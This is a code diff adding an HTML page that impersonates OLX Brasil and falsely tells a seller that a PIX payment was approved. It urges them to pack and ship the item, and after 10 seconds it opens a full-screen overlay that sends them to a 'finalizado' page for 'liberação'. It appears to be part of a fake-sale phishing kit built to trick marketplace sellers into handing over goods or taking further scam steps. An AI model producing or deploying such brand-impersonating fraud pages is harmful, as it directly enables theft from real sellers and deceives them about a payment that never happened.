@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pagamento Aprovado - OLX">
+    <title>Pagamento Aprovado - OLX Brasil</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
+    <style>
+        :root {
+            --primary-color: #49b675;
+            --secondary-color: #6e0ad6;
+            --accent-color: #4a90e2;
+            --light-color: #f7f9fc;
+            --success-color: #28a745;
+            --text-color: #333;
+            --text-light: #666;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--light-color);
+            margin: 0;
+            padding: 0;
+            color: var(--text-color);
+        }
+
+        .success-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 85vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .success-card {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            text-align: center;
+            margin: 20px 0;
+            opacity: 0;
+            animation: fadeIn 1s ease-in forwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-title {
+            color: var(--success-color);
+            font-size: 32px;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .success-subtitle {
+            color: var(--text-light);
+            font-size: 20px;
+            margin-bottom: 30px;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: var(--success-color);
+            margin-bottom: 20px;
+            display: inline-block;
+            animation: bounceIn 1s ease;
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0.1); opacity: 0; }
+            60% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+
+        .delivery-icons {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin: 40px 0;
+            gap: 20px;
+        }
+
+        .delivery-item {
+            flex: 1;
+            min-width: 150px;
+            max-width: 200px;
+            margin: 10px;
+            padding: 20px;
+            background-color: var(--light-color);
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            opacity: 0;
+        }
+
+        .delivery-item i {
+            font-size: 40px;
+            margin-bottom: 15px;
+            color: var(--accent-color);
+        }
+
+        .delivery-item h3 { font-size: 18px; margin-bottom: 10px; color: var(--text-color); }
+        .delivery-item p { font-size: 14px; color: var(--text-light); }
+
+        .delivery-animation {
+            height: 180px;
+            background-color: var(--light-color);
+            border-radius: 10px;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .map-bg {
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPGRlZnM+CiAgICA8cGF0dGVybiBpZD0iZ3JpZCIgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiBwYXR0ZXJuVW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgICAgPHBhdGggZD0iTSAwIDEwIEwgNDAgMTAgTSAxMCAwIEwgMTAgNDAiIGZpbGw9Im5vbmUiIHN0cm9rZT0iI2UwZTBlMCIgc3Ryb2tlLXdpZHRoPSIxIi8+CiAgICA8L3BhdHRlcm4+CiAgPC9kZWZzPgogIDxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjZ3JpZCkiIC8+Cjwvc3ZnPg==');
+            opacity: 0.7;
+        }
+
+        .delivery-car {
+            position: absolute;
+            bottom: 30px;
+            left: -50px;
+            font-size: 24px;
+            color: var(--secondary-color);
+            animation: moveCar 10s linear infinite;
+        }
+
+        @keyframes moveCar {
+            0% { left: -50px; }
+            100% { left: calc(100% + 50px); }
+        }
+
+        .delivery-pin {
+            position: absolute;
+            top: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: var(--secondary-color);
+            font-size: 30px;
+            animation: dropPin 1s ease forwards;
+        }
+
+        @keyframes dropPin {
+            0% { top: -30px; opacity: 0; }
+            60% { top: 60px; opacity: 1; }
+            80% { top: 45px; }
+            100% { top: 50px; }
+        }
+
+        .success-buttons {
+            margin-top: 40px;
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn-secondary {
+            background-color: var(--secondary-color);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .order-details {
+            background-color: var(--light-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: left;
+        }
+
+        .order-details h3 {
+            color: var(--secondary-color);
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0;
+        }
+
+        .detail-label { font-weight: bold; color: var(--text-light); }
+
+        footer {
+            background-color: white;
+            text-align: center;
+            padding: 20px;
+            color: var(--text-light);
+            font-size: 14px;
+            margin-top: 40px;
+            border-top: 1px solid #eee;
+        }
+
+        /* --- ESTILOS DO OVERLAY ATUALIZADOS --- */
+        #custom-olx-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 999999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(4px);
+        }
+
+        .olx-modal {
+            background: #fff;
+            padding: 35px 25px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+            width: 90%;
+            max-width: 360px;
+        }
+
+        .olx-modal h2 {
+            color: #333;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .olx-modal p {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .btn-olx-continuar {
+            background-color: #6e0ad6;
+            color: #ffffff !important;
+            border: none;
+            border-radius: 24px;
+            padding: 16px 0;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            display: block;
+            text-decoration: none;
+            transition: transform 0.2s;
+        }
+
+        .btn-olx-continuar:hover {
+            background-color: #5a08b0;
+            transform: scale(1.02);
+        }
+    </style>
+</head>
+
+<body>
+    <div id="custom-olx-overlay">
+        <div class="olx-modal">
+            <h2>Venda Finalizada!</h2>
+            <p>O processo de pagamento foi concluído com sucesso. Siga para a página final para conferir os detalhes da retirada e liberação.</p>
+            <a href="/pag/finalizado.html" class="btn-olx-continuar">Continuar</a>
+        </div>
+    </div>
+
+    <div class="app-container">
+        <div class="header-content" style="padding: 15px 20px; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+            <div class="logo">
+                <img src="/images/olx-logo.png" alt="Logo OLX" style="height: 35px;">
+            </div>
+        </div>
+
+        <div class="success-container">
+            <div class="success-card">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h1 class="success-title">Pagamento Aprovado com Sucesso!</h1>
+                <p class="success-subtitle">Obrigado! Prepare seu Pedido!</p>
+
+                <div class="delivery-icons">
+                    <div class="delivery-item" id="item-1">
+                        <i class="fas fa-car"></i>
+                        <h3>Transporte Seguro</h3>
+                        <p>Prepare seu Produto para Entrega!</p>
+                    </div>
+                    <div class="delivery-item" id="item-2">
+                        <i class="fas fa-user-astronaut"></i>
+                        <h3>Entregador a Caminho</h3>
+                        <p>Verifique um Entregador de Confiança: Uber, e etc.</p>
+                    </div>
+                    <div class="delivery-item" id="item-3">
+                        <i class="fas fa-box"></i>
+                        <h3>Embalagem Segura</h3>
+                        <p>Prepare a Embalagem do Produto!</p>
+                    </div>
+                    <div class="delivery-item" id="item-4">
+                        <i class="fas fa-map-marked-alt"></i>
+                        <h3>Rastreamento</h3>
+                        <p>Acompanhamento em Tempo Real!</p>
+                    </div>
+                </div>
+
+                <div class="delivery-animation">
+                    <div class="map-bg"></div>
+                    <div class="delivery-pin"><i class="fas fa-map-pin"></i></div>
+                    <div class="delivery-car"><i class="fas fa-truck"></i></div>
+                </div>
+
+                <div class="order-details">
+                    <h3>Detalhes do pedido</h3>
+                    <div class="detail-item">
+                        <span class="detail-label">Número do pedido:</span>
+                        <span class="detail-value">#OLX98765432</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Data da compra:</span>
+                        <span class="detail-value" id="data-compra"></span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Valor pago:</span>
+                        <span class="detail-value">R$ 99,00</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Forma de pagamento:</span>
+                        <span class="detail-value">PIX</span>
+                    </div>
+                </div>
+
+                <div class="success-buttons">
+                    <a href="/" class="btn-secondary">
+                        <i class="fas fa-home"></i> Voltar ao início
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
+            <p>CNPJ: 13.673.743/0002-55 - Avenida Paulista, 1000 - São Paulo/SP</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Animações dos itens de entrega
+            const items = document.querySelectorAll('.delivery-item');
+            items.forEach((item, index) => {
+                setTimeout(() => {
+                    item.style.animation = `fadeIn 0.8s forwards`;
+                    item.style.opacity = 1;
+                }, 300 * (index + 1));
+            });
+
+            // Data automática
+            const dataCompra = document.getElementById('data-compra');
+            const hoje = new Date();
+            dataCompra.textContent = hoje.toLocaleDateString('pt-BR');
+
+            // --- MOSTRAR OVERLAY APÓS 10 SEGUNDOS ---
+            setTimeout(function() {
+                document.getElementById('custom-olx-overlay').style.display = 'flex';
+            }, 10000);
+        });
+    </script>
+</body>
+
+</html>
